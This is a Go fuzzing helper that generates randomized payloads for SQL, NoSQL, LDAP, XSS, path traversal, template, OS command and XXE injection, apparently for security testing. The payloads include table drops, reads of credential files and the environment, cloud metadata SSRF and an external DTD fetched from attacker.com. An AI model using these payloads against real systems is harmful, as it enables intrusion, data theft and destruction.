package fuzz

import (
	"fmt"
	"math/rand"
	"strings"
	"time"
)

// randFromGrammar picks a random template from the grammar and fills variable
// parts using simple token replacement. Shared by all injection generators to
// keep selection/seeding logic DRY.
func randFromGrammar(grammar []string, seed ...int64) string {
	s := seedOrNow(seed)
	r := rand.New(rand.NewSource(s))
	tpl := grammar[r.Intn(len(grammar))]

	// Replace {{INT}} with a small random int
	for strings.Contains(tpl, "{{INT}}") {
		tpl = strings.Replace(tpl, "{{INT}}", fmt.Sprintf("%d", r.Intn(9999)+1), 1)
	}
	// Replace {{COL}} with a random column name
	cols := []string{"id", "username", "email", "password", "name", "role", "token", "secret"}
	for strings.Contains(tpl, "{{COL}}") {
		tpl = strings.Replace(tpl, "{{COL}}", cols[r.Intn(len(cols))], 1)
	}
	// Replace {{TBL}} with a random table name
	tables := []string{"users", "accounts", "orders", "sessions", "tokens", "admin", "config"}
	for strings.Contains(tpl, "{{TBL}}") {
		tpl = strings.Replace(tpl, "{{TBL}}", tables[r.Intn(len(tables))], 1)
	}
	// Replace {{TAG}} with a random HTML tag
	tags := []string{"img", "svg", "body", "iframe", "input", "details", "marquee", "video", "audio"}
	for strings.Contains(tpl, "{{TAG}}") {
		tpl = strings.Replace(tpl, "{{TAG}}", tags[r.Intn(len(tags))], 1)
	}
	// Replace {{EVT}} with a random JS event handler
	events := []string{"onerror", "onload", "onfocus", "onmouseover", "onclick", "oninput", "onanimationend"}
	for strings.Contains(tpl, "{{EVT}}") {
		tpl = strings.Replace(tpl, "{{EVT}}", events[r.Intn(len(events))], 1)
	}
	// Replace {{CMD}} with a random shell command
	cmds := []string{"id", "whoami", "cat /etc/passwd", "ls -la", "uname -a", "env", "pwd"}
	for strings.Contains(tpl, "{{CMD}}") {
		tpl = strings.Replace(tpl, "{{CMD}}", cmds[r.Intn(len(cmds))], 1)
	}
	// Replace {{DEPTH}} with random traversal depth
	for strings.Contains(tpl, "{{DEPTH}}") {
		depth := r.Intn(8) + 2
		tpl = strings.Replace(tpl, "{{DEPTH}}", strings.Repeat("../", depth), 1)
	}
	// Replace {{DELAY}} with a random delay value
	for strings.Contains(tpl, "{{DELAY}}") {
		tpl = strings.Replace(tpl, "{{DELAY}}", fmt.Sprintf("%d", r.Intn(10)+3), 1)
	}
	return tpl
}

func seedOrNow(seed []int64) int64 {
	if len(seed) > 0 && seed[0] > 0 {
		return seed[0]
	}
	return time.Now().UnixNano()
}

// --- SQL Injection ---

var sqliGrammar = []string{
	// Boolean-based
	"' OR 1=1--",
	"' OR '1'='1'--",
	"\" OR \"1\"=\"1\"--",
	"' OR {{INT}}={{INT}}--",
	"1' OR '1'='1' /*",
	"admin'--",
	"' OR 1=1#",
	"') OR ('1'='1",
	"' OR ''='",
	// Error-based
	"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT {{COL}} FROM {{TBL}} LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
	"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--",
	"' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)--",
	"CONVERT(int,(SELECT @@version))--",
	// UNION-based
	"' UNION SELECT NULL,{{COL}} FROM {{TBL}}--",
	"' UNION SELECT NULL,NULL,NULL--",
	"1 UNION ALL SELECT NULL,NULL,CONCAT({{COL}}) FROM {{TBL}}--",
	"' UNION SELECT {{INT}},{{INT}},{{INT}}--",
	// Time-based blind
	"' OR SLEEP({{DELAY}})--",
	"'; WAITFOR DELAY '0:0:{{DELAY}}'--",
	"' OR pg_sleep({{DELAY}})--",
	"' OR BENCHMARK(10000000,SHA1('test'))--",
	"1; SELECT CASE WHEN (1=1) THEN pg_sleep({{DELAY}}) ELSE pg_sleep(0) END--",
	// Stacked queries
	"'; DROP TABLE {{TBL}};--",
	"1; INSERT INTO {{TBL}} VALUES('pwned')--",
	"'; UPDATE {{TBL}} SET {{COL}}='hacked'--",
}

// RandSQLi returns a randomized SQL injection payload.
func RandSQLi(seed ...int64) string {
	return randFromGrammar(sqliGrammar, seed...)
}

// SeededRandSQLi returns a deterministic SQL injection payload for the given seed.
func SeededRandSQLi(seed int64) string {
	return RandSQLi(seed)
}

// --- Cross-Site Scripting (XSS) ---

var xssGrammar = []string{
	// Reflected
	"<script>alert({{INT}})</script>",
	"<{{TAG}} {{EVT}}=alert({{INT}})>",
	"<{{TAG}} {{EVT}}=\"alert(document.cookie)\">",
	"\"><script>alert(String.fromCharCode(88,83,83))</script>",
	"'><{{TAG}} {{EVT}}=alert({{INT}})>",
	"<svg/onload=alert({{INT}})>",
	"<img src=x {{EVT}}=alert({{INT}})>",
	// DOM-based
	"javascript:alert({{INT}})",
	"'-alert({{INT}})-'",
	"\";alert({{INT}});//",
	// Stored / encoding bypass
	"<scr<script>ipt>alert({{INT}})</scr</script>ipt>",
	"<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;{{INT}}&#41;>",
	"<svg><animate {{EVT}}=alert({{INT}}) attributeName=x dur=1s>",
	"<math><mtext><table><mglyph><style><!--</style><{{TAG}} {{EVT}}=alert({{INT}})>",
	// Attribute injection
	"\" autofocus {{EVT}}=alert({{INT}}) \"",
	"' {{EVT}}=alert({{INT}}) '",
}

// RandXSS returns a randomized cross-site scripting payload.
func RandXSS(seed ...int64) string {
	return randFromGrammar(xssGrammar, seed...)
}

// SeededRandXSS returns a deterministic XSS payload for the given seed.
func SeededRandXSS(seed int64) string {
	return RandXSS(seed)
}

// --- Path Traversal ---

var pathTraversalGrammar = []string{
	// Unix
	"{{DEPTH}}etc/passwd",
	"{{DEPTH}}etc/shadow",
	"{{DEPTH}}etc/hosts",
	"{{DEPTH}}proc/self/environ",
	"{{DEPTH}}var/log/syslog",
	// Windows
	"{{DEPTH}}windows\\system.ini",
	"{{DEPTH}}windows\\win.ini",
	"{{DEPTH}}boot.ini",
	// URL-encoded
	"..%2f..%2f..%2fetc%2fpasswd",
	"..%252f..%252f..%252fetc%252fpasswd",
	"%2e%2e/%2e%2e/%2e%2e/etc/passwd",
	// Null byte (legacy)
	"{{DEPTH}}etc/passwd%00.jpg",
	"{{DEPTH}}etc/passwd%00.png",
	// Double encoding
	"..%255c..%255c..%255cwindows%255csystem.ini",
	"..%c0%af..%c0%af..%c0%afetc/passwd",
}

// RandPathTraversal returns a randomized path traversal payload.
func RandPathTraversal(seed ...int64) string {
	return randFromGrammar(pathTraversalGrammar, seed...)
}

// SeededRandPathTraversal returns a deterministic path traversal payload for the given seed.
func SeededRandPathTraversal(seed int64) string {
	return RandPathTraversal(seed)
}

// --- Server-Side Template Injection (SSTI) ---

var sstiGrammar = []string{
	// Jinja2 / Python
	"{{\"{{7*7}}\"}}",
	"{{\"{{config}}\"}}",
	"{{\"{{self.__class__.__mro__[2].__subclasses__()}}\"}}",
	"${7*7}",
	"#{7*7}",
	// Freemarker / Java
	"<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"{{CMD}}\")}",
	"${\"freemarker.template.utility.Execute\"?new()(\"{{CMD}}\")}",
	// Twig / PHP
	"{{\"{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('\"}}{{CMD}}{{\")}}\"}}",
	// ERB / Ruby
	"<%= system('{{CMD}}') %>",
	"<%= `{{CMD}}` %>",
	// Expression language
	"${{{INT}}*{{INT}}}",
	"#{{{INT}}*{{INT}}}",
	"${{\"{{\"}}{{INT}}*{{INT}}{{\"}}\"}}",
}

// RandSSTI returns a randomized server-side template injection payload.
func RandSSTI(seed ...int64) string {
	return randFromGrammar(sstiGrammar, seed...)
}

// SeededRandSSTI returns a deterministic SSTI payload for the given seed.
func SeededRandSSTI(seed int64) string {
	return RandSSTI(seed)
}

// --- OS Command Injection ---

var cmdInjectionGrammar = []string{
	// Semicolon
	"; {{CMD}}",
	"& {{CMD}}",
	"&& {{CMD}}",
	"| {{CMD}}",
	"|| {{CMD}}",
	// Backtick
	"`{{CMD}}`",
	// Subshell
	"$({{CMD}})",
	"$({{{CMD}}})",
	// Newline
	"%0a{{CMD}}",
	"\n{{CMD}}",
	// Pipe chain
	"| {{CMD}} | head -1",
	"; {{CMD}} > /tmp/out",
	// Windows
	"& {{CMD}} &",
	"| {{CMD}} |",
}

// RandCmdInjection returns a randomized OS command injection payload.
func RandCmdInjection(seed ...int64) string {
	return randFromGrammar(cmdInjectionGrammar, seed...)
}

// SeededRandCmdInjection returns a deterministic command injection payload for the given seed.
func SeededRandCmdInjection(seed int64) string {
	return RandCmdInjection(seed)
}

// --- NoSQL Injection ---

var nosqliGrammar = []string{
	// MongoDB operator injection
	"{\"$gt\": \"\"}",
	"{\"$ne\": null}",
	"{\"$gt\": \"\", \"$lt\": \"~\"}",
	"{\"$regex\": \".*\"}",
	"{\"$where\": \"this.{{COL}} == this.{{COL}}\"}",
	"{\"$or\": [{\"{{COL}}\": {\"$gt\": \"\"}}, {\"{{COL}}\": {\"$gt\": \"\"}}]}",
	// JSON injection
	"true, \"$or\": [{}, {\"{{COL}}\": \"admin\"}], \"a\": \"b",
	"{\"{{COL}}\": {\"$regex\": \"^a\"}}",
	// Server-side JS
	"'; return true; var a='",
	"1; return db.{{TBL}}.find();",
	"{\"$where\": \"sleep({{DELAY}}000)\"}",
}

// RandNoSQLi returns a randomized NoSQL injection payload.
func RandNoSQLi(seed ...int64) string {
	return randFromGrammar(nosqliGrammar, seed...)
}

// SeededRandNoSQLi returns a deterministic NoSQL injection payload for the given seed.
func SeededRandNoSQLi(seed int64) string {
	return RandNoSQLi(seed)
}

// --- LDAP Injection ---

var ldapiGrammar = []string{
	"*(|(uid=*))",
	"*)(uid=*))(|(uid=*)",
	"admin)(&)",
	"*)(|(objectClass=*))",
	"admin))(|(cn=*)",
	"*))%00",
	"*()|%26'",
	"admin)(|(password=*))",
	"*)(cn=*))(&(objectClass=person)",
}

// RandLDAPi returns a randomized LDAP injection payload.
func RandLDAPi(seed ...int64) string {
	return randFromGrammar(ldapiGrammar, seed...)
}

// SeededRandLDAPi returns a deterministic LDAP injection payload for the given seed.
func SeededRandLDAPi(seed int64) string {
	return RandLDAPi(seed)
}

// --- XML External Entity (XXE) ---

var xxeGrammar = []string{
	// File read
	"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
	"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>",
	"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><foo>&xxe;</foo>",
	// SSRF
	"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>",
	"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:{{INT}}/\">]><foo>&xxe;</foo>",
	// Parameter entity
	"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]><foo>bar</foo>",
	// Billion laughs (truncated/safe variant)
	"<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;\">]><foo>&lol3;</foo>",
	// PHP wrapper
	"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]><foo>&xxe;</foo>",
}

// RandXXE returns a randomized XML External Entity payload.
func RandXXE(seed ...int64) string {
	return randFromGrammar(xxeGrammar, seed...)
}

// SeededRandXXE returns a deterministic XXE payload for the given seed.
func SeededRandXXE(seed int64) string {
	return RandXXE(seed)
}

// AllInjectionPayloads returns one random payload from each injection class.
// Useful for generating a diverse set of payloads in a single call.
func AllInjectionPayloads(seed ...int64) map[string]string {
	return map[string]string{
		"sqli":           RandSQLi(seed...),
		"xss":            RandXSS(seed...),
		"path-traversal": RandPathTraversal(seed...),
		"ssti":           RandSSTI(seed...),
		"cmd-injection":  RandCmdInjection(seed...),
		"nosqli":         RandNoSQLi(seed...),
		"ldapi":          RandLDAPi(seed...),
		"xxe":            RandXXE(seed...),
	}
}
